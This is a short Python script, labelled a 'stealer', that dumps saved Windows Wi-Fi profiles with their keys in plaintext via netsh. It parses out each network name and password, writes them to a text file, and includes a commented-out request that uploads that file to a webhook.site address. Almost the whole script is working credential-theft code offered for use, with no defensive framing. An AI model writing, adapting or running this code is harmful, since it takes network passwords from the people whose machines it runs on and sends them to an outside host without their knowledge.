import os
import subprocess
import sys


#stealer url


#Create a file
password_file = open('password.txt','w')
password_file.write("Hello there! here are your password:\n\n")
password_file.close()

#Lists
wifi_files = []
wifi_names = []
wifi_password = []


#use python to execute a windows command
command = subprocess.run(["netsh","wlan","export","profile"
,"key=clear"],capture_output=True).stdout.decode()

#Grab current directory
path = os.getcwd()

#Do the hackies
for filename in os.listdir(path):
    if filename.startswith("wifi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i,'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_names.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()    
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x,y in zip(wifi_names,wifi_password):
                            sys.stdout = open("password.txt","a")
                            print("SSID:"+x, "Password:"+y, sep='\n')
                            sys.stdout.close()
#Send the hackies 
"""with open('password.txt','rb') as f:
    r = requests.post('https://webhook.site/30a6904a-5531-43ff-b5da-f1f93cbd9d3b', data=f)"""




